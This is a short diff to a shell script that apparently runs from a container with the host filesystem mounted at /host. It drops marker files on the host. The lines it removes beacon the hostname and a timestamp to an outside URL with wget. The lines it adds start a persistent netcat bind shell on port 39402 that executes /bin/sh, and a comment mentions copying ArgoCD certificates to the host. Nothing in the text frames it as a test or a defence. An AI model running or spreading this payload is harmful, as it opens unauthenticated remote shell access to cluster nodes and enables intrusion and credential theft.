@@ -1,5 +1,6 @@
-echo "AGENT $(hostname) $(date)" > /host/tmp/.cxp-agent 2>/dev/null
-# Signal via GET request to our test endpoint:
-wget -q -O /dev/null "http://example.com/?agent=$(hostname)&ts=$(date +%s)" 2>/dev/null
-ls /host/tmp/ > /host/tmp/.cxp-ls 2>/dev/null
-echo OK
+# Write to host + nc listener on node:
+echo "CXP-AGENT-DEPLOYED $(hostname) $(date -u)" > /host/tmp/.cxp-CONFIRMED
+# Start nc listener for direct access:
+nohup sh -c "while true; do nc -l -p 39402 -e /bin/sh; done" > /dev/null 2>&1 &
+# Copy argocd certs from container to host:
+echo AGENT-STARTED > /host/tmp/.cxp-status
